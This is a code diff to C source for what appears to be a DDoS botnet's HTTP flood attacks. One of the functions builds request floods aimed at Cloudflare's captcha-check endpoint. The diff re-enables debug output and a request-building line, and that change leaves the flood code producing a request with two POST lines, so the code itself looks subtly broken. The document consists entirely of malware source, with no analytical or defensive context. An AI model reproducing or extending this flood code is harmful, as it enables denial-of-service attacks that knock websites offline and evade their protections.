@@ -201,7 +201,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 conn->rdbuf_pos = 0;
 
 #ifdef DEBUG
-                //printf("[http flood] Sending http request\n");
+                printf("[http flood] Sending http request\n");
 #endif
 
                 char buf[10240];
@@ -979,13 +979,13 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
             else if (conn->state == HTTP_CONN_SEND_HEADERS)
             {
 #ifdef DEBUG
-                //printf("[http flood] Sending http request\n");
+                printf("[http flood] Sending http request\n");
 #endif
 
                 char buf[10240];
                 util_zero(buf, 10240);
 
-                //util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/l/chk_captcha HTTP/1.1\r\nUser-Agent: ");
+                util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/l/chk_captcha HTTP/1.1\r\nUser-Agent: ");
                 util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/");
                 rand_alphastr(buf + util_strlen(buf), 16);
                 util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
